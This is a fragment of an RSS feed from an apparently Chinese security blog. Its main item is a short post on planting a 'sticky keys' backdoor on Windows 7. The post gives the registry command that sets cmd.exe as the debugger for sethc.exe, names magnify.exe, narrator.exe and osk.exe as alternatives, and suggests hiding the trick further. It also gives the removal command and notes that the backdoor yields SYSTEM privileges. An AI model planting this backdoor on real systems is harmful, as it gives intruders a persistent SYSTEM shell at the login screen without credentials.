        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/08/11/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AC%AC2%E7%AB%A0%E7%AC%94%E8%AE%B0/</guid>
        
        <category>计算机系统</category>
        
        
        <category>auxilary</category>
        
      </item>
    
      <item>
        <title>win7粘滞键后门</title>
        <description>&lt;h3 id=&quot;0x0-about&quot;&gt;0x0 About&lt;/h3&gt;

&lt;p&gt;win03下copy命令可制作粘滞键后门,测试在win7上copy方法无效,本文记录win7下的方法&lt;/p&gt;

&lt;h3 id=&quot;0x1-detail&quot;&gt;0x1 Detail&lt;/h3&gt;

&lt;p&gt;以管理员身份打开cmd.exe运行如下:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\windows\system32\cmd.exe&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;其中sethc.exe可替换成magnify.exe(放大镜)或其他(eg.narrator.exe/osk.exe),替换成更隐藏的技巧可根据下面链接自由发挥&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://answers.microsoft.com/en-us/windows/forum/windows_7-performance/run-command/a2632e97-c8d1-4ab3-8df2-7e70a4448267&quot;&gt;AsULike&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;删除后门以管理员身份打开cmd.exe运行如下即可:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;REG DELETE &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;以上理论上适用于win vistar以上系统,只在win7上测试过.&lt;/p&gt;

&lt;p&gt;以上可由管理员权限得到system权限,也可用于替代psexec.exe -s cmd.exe开system权限&lt;/p&gt;
</description>
        <pubDate>Thu, 03 Aug 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/08/03/win7%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/08/03/win7%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/</guid>
        
        <category>后门</category>
        
        <category>win7</category>
        
        
        <category>web</category>
        
      </item>
    
  </channel>
</rss>
